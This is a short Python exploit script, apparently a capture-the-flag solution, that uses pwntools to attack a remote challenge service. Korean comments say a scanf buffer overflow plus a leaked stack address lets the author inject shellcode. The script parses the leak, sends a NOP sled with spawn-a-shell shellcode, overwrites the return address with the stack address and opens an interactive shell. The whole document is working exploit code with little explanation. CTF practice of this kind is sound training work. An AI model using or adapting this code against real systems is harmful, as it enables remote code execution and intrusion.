from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
'''

context(arch="i386", os='linux')

r = remote("ctf.j0n9hyun.xyz", 3006)

# scanf에 bof취약점이 있었고
# 입력받은 것을 출력하면서 stack의 주소를 출력해주었다
# 이를 이용해 shellcode를 삽입하고 ret를 stack주소로 덮었다

r.recv()
r.sendline(b"a")
addr = r.recvuntil(":")
addr = addr.strip()
addr = int(addr[2:-1], 16)
r.sendline(b"y")
payload  = b"\x90"*0x10+asm(shellcraft.sh())
payload += b"\x90"*(0x88-len(payload)+4)
payload += p32(addr)
r.sendline(payload)

r.interactive()